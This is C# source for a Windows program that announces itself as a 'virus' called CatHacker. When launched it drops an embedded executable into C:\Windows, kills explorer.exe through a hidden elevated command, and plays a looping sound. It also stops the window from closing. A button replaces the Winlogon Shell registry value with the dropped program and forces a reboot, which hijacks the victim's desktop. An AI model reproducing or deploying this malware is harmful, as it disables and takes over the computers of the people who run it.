using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using Microsoft.Win32;
using System.IO;
using System.Reflection;
using System.Security.Principal;

namespace CatHacker
{
    public partial class CatHackerInfectPC : Form
    {
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //This is Very Important Code... DON'T CHANGE THIS!!! 

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        SoundPlayer cathacker;
        public CatHackerInfectPC()
        {
            InitializeComponent();
            Directory.CreateDirectory(@"C:\Temp");
            if (WindowsIdentity.GetCurrent().IsSystem)
            {
                Debug.WriteLine("you runned as system");
            }
            Extract("CatHacker", @"C:\Temp", "Resources", "CatHackerShell.exe");
            Extract("CatHacker", @"C:\Temp", "Resources", "CatHacker.wav");
            ProcessStartInfo explorerdead = new ProcessStartInfo();
            explorerdead.FileName = "cmd.exe";
            explorerdead.Arguments = "/c taskkill /f /im explorer.exe";
            explorerdead.WindowStyle = ProcessWindowStyle.Hidden;
            explorerdead.Verb = "runas";
            Process.Start(explorerdead);
            cathacker = new SoundPlayer(@"C:\Temp\CatHacker.wav");
            cathacker.PlayLooping();
            if (File.Exists(@"C:\Temp\CatHackerShell.exe"))
            {
                string tmp = @"C:\Temp";
                File.Copy(@"C:\Temp\CatHackerShell.exe", @"C:\Windows\CatHackerShell.exe");
                DirectoryInfo tmpfile = new DirectoryInfo(tmp);
                FileInfo[] ttmp = tmpfile.GetFiles("CatHackerShell.exe");
                foreach(FileInfo ftmpinfo in ttmp)
                {
                    ftmpinfo.Delete();
                }
                Debug.Write("CatHackerShell is found and successfully deleted in directory Temp...");
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Cat Hacker is Defeated your PC... Well... This is Epic Fail, Man :D" + Environment.NewLine + "Creator of this virus is StopKranker", "CatHacker", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            string sh = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
            RegistryKey locmachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64); //if you have 32-bit machine, write this code: RegistryKey locmach32 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);
            RegistryKey shelloverwrite = locmachine.OpenSubKey(sh, true);
            shelloverwrite.DeleteValue("Shell");
            shelloverwrite.SetValue("Shell", "CatHackerShell.exe");
            shelloverwrite.Close();
            Process.Start("shutdown", "/r /t 5");
            Debug.Write("PC is automatic restarting and overwritten Shell...");
            Environment.Exit(1123);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            var FFF = new PCisonFire();
            FFF.ShowDialog();
        }

        private void CatHackerInfectPC_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }
}
